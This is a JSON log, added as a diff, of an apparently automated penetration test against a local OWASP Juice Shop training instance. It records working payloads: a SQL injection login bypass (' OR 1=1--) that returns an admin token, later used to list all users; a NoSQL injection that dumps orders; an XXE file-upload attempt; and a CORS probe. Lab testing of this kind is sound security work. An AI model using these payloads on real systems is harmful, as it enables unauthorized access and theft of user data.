@@ -1,0 +1,411 @@
+{
+  "target": "http://127.0.0.1:3000/",
+  "started_epoch": 1780904288.669603,
+  "elapsed_s": 0.574,
+  "events": [
+    {
+      "name": "cors-origin-arbitrary",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/",
+        "headers": {
+          "Origin": "http://attacker.example"
+        }
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/",
+        "elapsed_s": 0.003,
+        "content_type": "text/html; charset=UTF-8",
+        "content_length": null,
+        "response_len": 9936,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "<!-- ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors. ~ SPDX-License-Identifier: MIT --> <!doctype html> <html lang=\"en\" data-beasties-container> <head> <meta charset=\"utf-8\"> <title>OWASP Juice Shop</title> <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gsta"
+      },
+      "extra": {}
+    },
+    {
+      "name": "security-headers-home",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/",
+        "elapsed_s": 0.002,
+        "content_type": "text/html; charset=UTF-8",
+        "content_length": null,
+        "response_len": 9936,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "<!-- ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors. ~ SPDX-License-Identifier: MIT --> <!doctype html> <html lang=\"en\" data-beasties-container> <head> <meta charset=\"utf-8\"> <title>OWASP Juice Shop</title> <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gsta"
+      },
+      "extra": {}
+    },
+    {
+      "name": "directory-listing-ftp",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/ftp"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/ftp",
+        "elapsed_s": 0.004,
+        "content_type": "text/html; charset=utf-8",
+        "content_length": null,
+        "response_len": 11274,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "<!DOCTYPE html> <html> <head> <meta charset='utf-8'> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" /> <title>listing directory /ftp</title> <style>* { margin: 0; padding: 0; outline: 0; } body { padding: 80px 100px; font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\"; background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9)); background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9); background-repeat: no-repeat; color: #555; -webkit-font-smoothing: antialiased; } h1, h2, h3 { font-size: 22px; color: #343434; } h1 em, h2 em { padding: 0 5px; font-weight: normal; } h1 { font-size: 60px; } h2 { margin-top: 10px; } h3 { margin: 5px 0 10px 0; padding-bottom: 5px; border-bottom: 1px solid #eee; font-size: 18px; } ul li { list-style: none; } ul li:hover { cursor: pointer; color: #2e2e2e; } ul li .path { padding-left: 5px; font-weight: bold; } ul li .line { padding-right: 5px; font-style: italic; } u"
+      },
+      "extra": {}
+    },
+    {
+      "name": "directory-listing-well-known",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/.well-known"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/.well-known",
+        "elapsed_s": 0.003,
+        "content_type": "text/html; charset=utf-8",
+        "content_length": null,
+        "response_len": 8897,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "<!DOCTYPE html> <html> <head> <meta charset='utf-8'> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" /> <title>listing directory /.well-known</title> <style>* { margin: 0; padding: 0; outline: 0; } body { padding: 80px 100px; font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\"; background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9)); background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9); background-repeat: no-repeat; color: #555; -webkit-font-smoothing: antialiased; } h1, h2, h3 { font-size: 22px; color: #343434; } h1 em, h2 em { padding: 0 5px; font-weight: normal; } h1 { font-size: 60px; } h2 { margin-top: 10px; } h3 { margin: 5px 0 10px 0; padding-bottom: 5px; border-bottom: 1px solid #eee; font-size: 18px; } ul li { list-style: none; } ul li:hover { cursor: pointer; color: #2e2e2e; } ul li .path { padding-left: 5px; font-weight: bold; } ul li .line { padding-right: 5px; font-style: ita"
+      },
+      "extra": {}
+    },
+    {
+      "name": "api-docs",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/api-docs/"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/api-docs/",
+        "elapsed_s": 0.001,
+        "content_type": "text/html; charset=utf-8",
+        "content_length": null,
+        "response_len": 3106,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "<!-- HTML for static distribution bundle build --> <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"UTF-8\"> <title>Swagger UI</title> <link rel=\"stylesheet\" type=\"text/css\" href=\"./swagger-ui.css\" > <link rel=\"icon\" type=\"image/png\" href=\"./favicon-32x32.png\" sizes=\"32x32\" /><link rel=\"icon\" type=\"image/png\" href=\"./favicon-16x16.png\" sizes=\"16x16\" /> <style> html { box-sizing: border-box; overflow: -moz-scrollbars-vertical; overflow-y: scroll; } *, *:before, *:after { box-sizing: inherit; } body { margin:0; background: #fafafa; } </style> </head> <body> <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" style=\"position:absolute;width:0;height:0\"> <defs> <symbol viewBox=\"0 0 20 20\" id=\"unlocked\"> <path d=\"M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V6h2v-.801C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196"
+      },
+      "extra": {}
+    },
+    {
+      "name": "public-admin-config",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/rest/admin/application-configuration"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/rest/admin/application-configuration",
+        "elapsed_s": 0.005,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": null,
+        "response_len": 23513,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"config\":{\"server\":{\"port\":3000,\"basePath\":\"\",\"baseUrl\":\"http://localhost:3000\"},\"application\":{\"domain\":\"juice-sh.op\",\"name\":\"OWASP Juice Shop\",\"logo\":\"JuiceShop_Logo.png\",\"favicon\":\"favicon_js.ico\",\"theme\":\"bluegrey-lightgreen\",\"showVersionNumber\":true,\"showGitHubLinks\":true,\"localBackupEnabled\":true,\"numberOfRandomFakeUsers\":0,\"altcoinName\":\"Juicycoin\",\"privacyContactEmail\":\"donotreply@owasp-juice.shop\",\"customMetricsPrefix\":\"juiceshop\",\"chatBot\":{\"name\":\"Juicy the Smart Assistant\",\"avatar\":\"JuicyChatBot.png\",\"model\":\"gemma4:e4b\",\"llmMaxRetries\":2,\"sampleQuestions\":[\"CHATBOT_PROMPT_RECOMMENDATION_SUMMER_PARTY\",\"CHATBOT_PROMPT_RECOMMENDATION_POPULAR\",\"CHATBOT_PROMPT_RECOMMENDATION_SUGAR_FREE\",\"CHATBOT_PROMPT_RECOMMENDATION_START_DAY\",\"CHATBOT_PROMPT_RECOMMENDATION_SEASONAL\"]},\"social\":{\"blueSkyUrl\":\"https://bsky.app/profile/owasp-juice.shop\",\"mastodonUrl\":\"https://fosstodon.org/@owasp_juiceshop\",\"twitterUrl\":\"https://twitter.com/owasp_juiceshop\",\"facebookUrl\":\"https://www.facebook.c"
+      },
+      "extra": {}
+    },
+    {
+      "name": "public-admin-version",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/rest/admin/application-version"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/rest/admin/application-version",
+        "elapsed_s": 0.002,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": "20",
+        "response_len": 20,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"version\":\"20.0.0\"}"
+      },
+      "extra": {}
+    },
+    {
+      "name": "search-normal-baseline",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/rest/products/search?q=apple"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/rest/products/search?q=apple",
+        "elapsed_s": 0.021,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": "921",
+        "response_len": 921,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-06-08 07:03:07.700 +00:00\",\"updatedAt\":\"2026-06-08 07:03:07.700 +00:00\",\"deletedAt\":null},{\"id\":24,\"name\":\"Apple Pomace\",\"description\":\"Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href=\\\"/#recycle\\\">sent back to us</a> for recycling.\",\"price\":0.89,\"deluxePrice\":0.89,\"image\":\"apple_pressings.jpg\",\"createdAt\":\"2026-06-08 07:03:07.701 +00:00\",\"updatedAt\":\"2026-06-08 07:03:07.701 +00:00\",\"deletedAt\":null},{\"id\":47,\"name\":\"Pineapple Juice (1000ml)\",\"description\":\"Tropical refreshment from the finest sun-ripened pineapples.\",\"price\":2.99,\"deluxePrice\":2.99,\"image\":\"pineapple_juice.png\",\"createdAt\":\"2026-06-08 07:03:07.701 +00:00\",\"updatedAt\":\"2026-06-08 07:03:07.701 +00:00\",\"deletedAt\":null}]}"
+      },
+      "extra": {}
+    },
+    {
+      "name": "search-sqli-error-probe",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/rest/products/search?q=%27",
+        "payload": "'"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/rest/products/search?q=%27",
+        "elapsed_s": 0.017,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": "30",
+        "response_len": 30,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"status\":\"success\",\"data\":[]}"
+      },
+      "extra": {}
+    },
+    {
+      "name": "login-invalid-baseline",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:3000/rest/user/login",
+        "json": {
+          "email": "not-a-user@example.invalid",
+          "password": "definitely_wrong_20260608"
+        }
+      },
+      "response": {
+        "status_code": 401,
+        "url": "http://127.0.0.1:3000/rest/user/login",
+        "elapsed_s": 0.25,
+        "content_type": "text/html; charset=utf-8",
+        "content_length": "26",
+        "response_len": 26,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "Invalid email or password."
+      },
+      "extra": {}
+    },
+    {
+      "name": "login-sqli-bypass",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:3000/rest/user/login",
+        "json": {
+          "email": "' OR 1=1--",
+          "password": "irrelevant_20260608"
+        }
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/rest/user/login",
+        "elapsed_s": 0.083,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": "799",
+        "response_len": 799,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDYtMDggMDc6MDM6MDcuMjM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDYtMDggMDc6MDM6MDcuMjM4ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc4MDkwNDI4OX0.u3qrFV48AEC-rV9BFWCn7Oj8aNq7DyztxzqbrbOwdV4HD3Idn-l5x2aREyRQZgwDF8wAKQuKXKhzqDuJRTOlZirIyM6RC3X3PppXKWPFSot9vhtlf1xuLO-FLbrWPzEKoc3BKZsB1vtID2Pi0LapcpPBCRg3cX6x-49xCPjR8wA\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+      },
+      "extra": {
+        "token_present": true,
+        "bid": 1,
+        "umail": "admin@juice-sh.op"
+      }
+    },
+    {
+      "name": "api-users-unauth-baseline",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/api/Users"
+      },
+      "response": {
+        "status_code": 401,
+        "url": "http://127.0.0.1:3000/api/Users",
+        "elapsed_s": 0.002,
+        "content_type": "text/html; charset=utf-8",
+        "content_length": null,
+        "response_len": 972,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "<html> <head> <meta charset='utf-8'> <title>UnauthorizedError: No Authorization header was found</title> <style>* { margin: 0; padding: 0; outline: 0; } body { padding: 80px 100px; font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\"; background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9)); background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9); background-repeat: no-repeat; color: #555; -webkit-font-smoothing: antialiased; } h1, h2 { font-size: 22px; color: #343434; } h1 em, h2 em { padding: 0 5px; font-weight: normal; } h1 { font-size: 60px; } h2 { margin-top: 10px; } ul li { list-style: none; } #stacktrace { margin-left: 60px; } </style> </head> <body> <div id=\"wrapper\"> <h1>OWASP Juice Shop (Express ^4.22.1)</h1> <h2><em>401</em> UnauthorizedError: No Authorization header was found</h2> <ul id=\"stacktrace\"></ul> </div> </body> </html>"
+      },
+      "extra": {}
+    },
+    {
+      "name": "api-users-after-login-bypass",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/api/Users",
+        "auth": "Bearer/cookie token from login-sqli-bypass"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/api/Users",
+        "elapsed_s": 0.128,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": null,
+        "response_len": 6343,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"status\":\"success\",\"data\":[{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"createdAt\":\"2026-06-08T07:03:07.238Z\",\"updatedAt\":\"2026-06-08T07:03:07.238Z\",\"deletedAt\":null},{\"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/default.svg\",\"isActive\":true,\"createdAt\":\"2026-06-08T07:03:07.238Z\",\"updatedAt\":\"2026-06-08T07:03:07.238Z\",\"deletedAt\":null},{\"id\":3,\"username\":\"\",\"email\":\"bender@juice-sh.op\",\"role\":\"customer\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/default.svg\",\"isActive\":true,\"createdAt\":\"2026-06-08T07:03:07.238Z\",\"updatedAt\":\"2026-06-08T07:03:07.238Z\",\"deletedAt\":null},{\"id\":4,\"username\":\"bkimminich\",\"email\":\"bjoern.kimminich@gmail.com\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/"
+      },
+      "extra": {}
+    },
+    {
+      "name": "whoami-after-login-bypass",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/rest/user/whoami",
+        "auth": "Bearer/cookie token from login-sqli-bypass"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/rest/user/whoami",
+        "elapsed_s": 0.005,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": "125",
+        "response_len": 125,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\"}}"
+      },
+      "extra": {}
+    },
+    {
+      "name": "track-order-nosql-probe",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/rest/track-order/x%27%20%7C%7C%20true%20%7C%7C%20%27",
+        "payload": "x' || true || '"
+      },
+      "response": {
+        "status_code": 200,
+        "url": "http://127.0.0.1:3000/rest/track-order/x%27%20%7C%7C%20true%20%7C%7C%20%27",
+        "elapsed_s": 0.012,
+        "content_type": "application/json; charset=utf-8",
+        "content_length": "920",
+        "response_len": 920,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "{\"status\":\"success\",\"data\":[{\"orderId\":\"5267-669a9500e0c7acdd\",\"email\":\"*dm*n@j**c*-sh.*p\",\"totalPrice\":8.96,\"bonus\":0,\"products\":[{\"quantity\":3,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99,\"total\":5.97,\"bonus\":0},{\"quantity\":1,\"name\":\"Orange Juice (1000ml)\",\"price\":2.99,\"total\":2.99,\"bonus\":0}],\"eta\":\"4\",\"delivered\":false,\"_id\":\"GjW49GEQa52uc5WKa\"},{\"orderId\":\"5267-c7d81127dd5e5d76\",\"email\":\"*dm*n@j**c*-sh.*p\",\"totalPrice\":26.97,\"bonus\":3,\"products\":[{\"quantity\":3,\"name\":\"Eggfruit Juice (500ml)\",\"price\":8.99,\"total\":26.97,\"bonus\":3}],\"eta\":\"0\",\"delivered\":true,\"_id\":\"tmLisBxi8kmJyBhsv\"},{\"orderId\":\"fe01-6506f195c9808dee\",\"email\":\"d*m*\",\"totalPrice\":30.92,\"bonus\":0,\"products\":[{\"quantity\":3,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99,\"total\":5.97,\"bonus\":0},{\"quantity\":5,\"name\":\"Raspberry Juice (1000ml)\",\"price\":4.99,\"total\":24.950000000000003,\"bonus\":0}],\"eta\":\"0\",\"delivered\":true,\"_id\":\"YuDiQ8xQQfGzowoNv\"}]}"
+      },
+      "extra": {}
+    },
+    {
+      "name": "file-upload-unexpected-extension",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:3000/file-upload",
+        "file": "proof-20260608.txt",
+        "content_type": "text/plain"
+      },
+      "response": {
+        "status_code": 204,
+        "url": "http://127.0.0.1:3000/file-upload",
+        "elapsed_s": 0.007,
+        "content_type": "",
+        "content_length": null,
+        "response_len": 0,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": ""
+      },
+      "extra": {}
+    },
+    {
+      "name": "file-upload-xxe-local-lab-file",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:3000/file-upload",
+        "file": "proof-xxe-20260608.xml",
+        "entity": "file:///D:/WorkSpace/综合实践5/targets/juice-shop/ftp/legal.md"
+      },
+      "response": {
+        "status_code": 410,
+        "url": "http://127.0.0.1:3000/file-upload",
+        "elapsed_s": 0.006,
+        "content_type": "text/html; charset=utf-8",
+        "content_length": null,
+        "response_len": 4007,
+        "headers_subset": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Frame-Options": "SAMEORIGIN",
+          "X-Content-Type-Options": "nosniff"
+        },
+        "snippet": "<html> <head> <meta charset='utf-8'> <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: Entity &#39;xxe&#39; failed to parse</title> <style>* { margin: 0; padding: 0; outline: 0; } body { padding: 80px 100px; font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\"; background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9)); background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9); background-repeat: no-repeat; color: #555; -webkit-font-smoothing: antialiased; } h1, h2 { font-size: 22px; color: #343434; } h1 em, h2 em { padding: 0 5px; font-weight: normal; } h1 { font-size: 60px; } h2 { margin-top: 10px; } ul li { list-style: none; } #stacktrace { margin-left: 60px; } </style> </head> <body> <div id=\"wrapper\"> <h1>OWASP Juice Shop (Express ^4.22.1)</h1> <h2><em>410</em> Error: B2B customer complaints via file upload have been deprecated for security reasons: Entity &#39;xxe&#39; failed to parse</h2> <ul id=\"stack"
+      },
+      "extra": {}
+    }
+  ],
+  "auth_state": {
+    "initial_credentials": "none",
+    "created_lab_account": false,
+    "login_bypass_token_obtained": true,
+    "login_bypass_umail": "admin@juice-sh.op",
+    "login_bypass_bid": 1
+  }
+}
